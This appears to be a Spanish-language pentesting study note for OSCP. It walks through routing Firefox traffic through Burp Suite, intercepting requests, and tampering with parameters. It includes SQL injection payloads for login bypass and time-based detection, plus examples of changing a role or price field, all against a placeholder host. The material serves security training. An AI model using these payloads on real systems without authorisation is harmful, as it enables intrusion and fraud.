## 📚 **Índice 

- [[#🎯 Objetivo real]]
- [[#🎯 ¿Por qué Burp funciona para esto?]]
- [[#🧱 Arquitectura mental (flujo real)]]
- [[#⚙️ Configuración EXACTA del Proxy (Firefox + Burp)]]
    - [[#🔹 1. Arrancar Burp Suite]]
    - [[#🔹 2. Configurar Firefox (Manual Proxy)]]
- [[#🧲 Interceptar una petición (el momento clave)]]
- [[#✍️ Manipulación de parámetros (bypass real)]]
    - [[#🔓 1. Saltarse validaciones frontend]]
- [[#💉 SQL Injection básica vía Burp]]
- [[#🔁 Burp Repeater (modo laboratorio)]]
- [[#🧨 Bypass de restricciones comunes (checklist mental)]]
- [[#🧰 Herramientas de Burp que importan AQUÍ]]
    - [[#🔹 Proxy]]
    - [[#🔹 Repeater]]
    - [[#🔹 Intruder]]
    - [[#🔹 Comparer]]
- [[#🧠 Mentalidad OSCP / Real World]]
- [[#📌 Resumen ultra corto]]


> **Objetivo real:**  
> Interceptar peticiones del navegador, **modificar parámetros a mano**, y **bypassear validaciones** (frontend / backend) para probar **inyecciones SQL** u otras vulnerabilidades.

---

## 🎯 ¿Por qué Burp funciona para esto?

Porque **el navegador no manda lo que tú ves**, manda **lo que el backend recibe**.

- JavaScript valida → **Burp lo ignora**
    
- HTML bloquea campos → **Burp los cambia**
    
- Campos ocultos (`hidden`) → **Burp los edita**
    
- Valores “read-only” → **Burp los reescribe**
    
- Métodos GET/POST → **Burp los muta**
    

👉 **El servidor confía en la petición, no en la UI**.

---

## 🧱 Arquitectura mental (flujo real)

```
Navegador  →  Burp Proxy  →  Servidor
             (control total)
```

Burp se convierte en **MITM local**.

---

## ⚙️ Configuración EXACTA del Proxy (Firefox + Burp)

### 🔹 1. Arrancar Burp Suite

- Abrir **Burp Suite**
    
- Ir a:
    
    ```
    Proxy → Intercept
    ```
    
- Activar:
    
    ```
    Intercept: ON
    ```
    

Burp te mostrará una IP y puerto (normalmente):

```
127.0.0.1 : 8080
```

---

### 🔹 2. Configurar Firefox (Manual Proxy)

En Firefox:

```
☰ (arriba derecha)
→ Settings
→ abajo del todo: Network Settings
→ Settings…
```

Seleccionar:

```
Manual proxy configuration
```

Configurar:

```
HTTP Proxy: 127.0.0.1
Port: 8080
✔ Use this proxy for all protocols
```

Aceptar.

✅ **Todo el tráfico del navegador pasa ahora por Burp**.

---

## 🧲 Interceptar una petición (el momento clave)

1. Navega normalmente a la web objetivo
    
2. Envía un formulario / login / búsqueda
    
3. Burp **frena la petición automáticamente**
    

Ejemplo interceptado:

```http
POST /login.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

username=admin&password=1234
```

Aquí empieza el juego.

---

## ✍️ Manipulación de parámetros (bypass real)

### 🔓 1. Saltarse validaciones frontend

Ejemplos típicos:

#### ❌ El formulario no deja escribir símbolos

👉 Burp **sí**

```http
username=admin' OR '1'='1-- -
password=anything
```

---

#### ❌ Campo deshabilitado (`disabled`)

👉 Burp **lo modifica igual**

```http
role=user
```

Cámbialo a:

```http
role=admin
```

---

#### ❌ Campo oculto (`hidden`)

```html
<input type="hidden" name="price" value="100">
```

En Burp:

```http
price=1
```

---

## 💉 SQL Injection básica vía Burp

### Ejemplo clásico de login

Interceptado:

```http
POST /login.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

user=admin&pass=1234
```

Payload SQLi:

```http
user=admin'-- -
pass=irrelevant
```

O:

```http
user=' OR 1=1-- -
pass=x
```

Si accede → **SQLi confirmado**.

---

## 🔁 Burp Repeater (modo laboratorio)

Cuando ves algo interesante:

```
Right click → Send to Repeater
```

En **Repeater** puedes:

- Probar payloads uno por uno
    
- Cambiar métodos GET ↔ POST
    
- Ajustar headers
    
- Ver diferencias de respuesta
    

### Ejemplo en Repeater

```http
POST /search.php HTTP/1.1
Host: target.com

q=test
```

Payload:

```http
q=test' AND SLEEP(5)-- -
```

⏱️ Si tarda → **SQLi time-based**.

---

## 🧨 Bypass de restricciones comunes (checklist mental)

|Restricción|Burp lo rompe|
|---|---|
|Validación JS|✔|
|Campos deshabilitados|✔|
|Hidden inputs|✔|
|Longitud máxima|✔|
|Tipo de dato|✔|
|Método HTTP|✔|
|Headers falsos|✔|

---

## 🧰 Herramientas de Burp que importan AQUÍ

### 🔹 Proxy

- Interceptar tráfico
    
- Modificar peticiones en tiempo real
    

### 🔹 Repeater

- Probar SQLi manual
    
- Ajustar payloads
    
- Análisis fino de respuestas
    

### 🔹 Intruder

- Automatizar payloads
    
- Fuzzing de parámetros
    
- SQLi, auth bypass, brute force
    

### 🔹 Comparer

- Comparar respuestas
    
- Detectar diferencias sutiles (true/false)
    

---

## 🧠 Mentalidad OSCP / Real World

> **Nunca ataques la interfaz.  
> Ataca la petición.**

- Lo que el usuario **ve** no importa
    
- Lo que el servidor **recibe**, sí
    
- Burp es tu bisturí
    

---

## 📌 Resumen ultra corto

```
Firefox → Proxy manual → 127.0.0.1:8080
Burp → Proxy → Intercept ON

Interceptar request
Modificar parámetros
Bypassear validaciones
Probar SQLi en Repeater
```

---


